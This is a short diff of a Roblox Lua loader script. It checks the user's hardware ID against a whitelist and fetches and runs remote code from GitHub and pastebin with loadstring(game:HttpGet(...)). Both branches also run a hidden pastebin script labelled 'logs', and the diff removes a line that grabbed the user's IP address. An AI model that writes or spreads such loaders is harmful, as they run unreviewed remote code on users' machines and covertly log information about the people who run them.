@@ -5,15 +5,15 @@ local HWIDTable = {
 "481B9F95-D76E-4362-9E2B-4F32EEB76AE6" -- LxstHO4X
 }
 
-local IP = game:HttpGet('https://api.ipify.org', true)
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 
 for i,v in pairs(HWIDTable) do
     if v == HWID then
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sashkotashko420/wowwowowowpremium/main/mainpremium')))()
-        loadstring(game:HttpGet(('https://pastebin.com/raw/GruttHf6')))() -- premium logs
+        loadstring(game:HttpGet(('https://pastebin.com/raw/TAQrzzv2')))() -- logs
     else
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sashkotashko420/wowwowowow/main/mainfree')))()
         loadstring(game:HttpGet(('https://pastebin.com/raw/TAQrzzv2')))() -- logs
     end
 end
+
